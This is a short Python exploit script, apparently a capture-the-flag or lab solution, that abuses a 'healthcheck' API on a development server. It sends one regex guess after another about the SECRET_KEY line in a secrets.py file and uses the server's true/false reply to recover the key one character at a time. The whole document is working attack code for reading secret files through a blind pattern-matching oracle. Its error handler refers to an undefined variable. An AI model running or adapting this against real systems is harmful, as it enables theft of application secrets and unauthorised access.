##########################################

import os,sys, re
import string
import requests
import json

chars   = string.printable
cookies = {'session': 'session_cookie'}

sesh    = requests.Session()
pattern = ""

while True:
    for c in chars:
        try:
            
            resp = sesh.post('http://devel.thing.edus:8888/api/healthcheck', {
                'file': '/var/www/development/secrets.py',
                'type': 'custom',
                'pattern': "^SECRET_KEY = '" + pattern + c + ".*"
            }, cookies=cookies)
            if json.loads(resp.content)['result']:
                pattern += c
                print(pattern)
                break
            else:
                print(c)
                
        except Exception:
            print(rsp.content)

            
##########################################
##
##            
            
            
